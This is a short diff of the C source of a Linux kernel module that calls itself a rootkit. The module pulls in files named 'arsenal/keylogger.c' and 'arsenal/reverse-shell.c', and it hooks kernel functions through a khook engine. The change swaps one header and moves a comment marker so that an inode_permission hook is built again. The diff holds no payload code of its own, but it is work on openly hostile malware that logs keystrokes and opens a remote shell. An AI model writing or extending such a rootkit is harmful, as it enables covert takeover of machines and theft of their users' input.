@@ -6,7 +6,7 @@
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
-#include <linux/file.h>
+#include <linux/fs.h>
 #include "khook/engine.c"
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
@@ -41,6 +41,7 @@ static int khook_fget(unsigned int fd) {
     printk("%s(%d) = %d\n", __func__, fd, original);
     return original;
 }
+**/
 
 // Example hook for testing build process.
 KHOOK(inode_permission);
@@ -50,7 +51,7 @@ static int khook_inode_permission(struct inode* inode, int mask) {
 	printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
 	return ret;
 }
-**/
+
 
 /**
  * Rootkit module initialization.
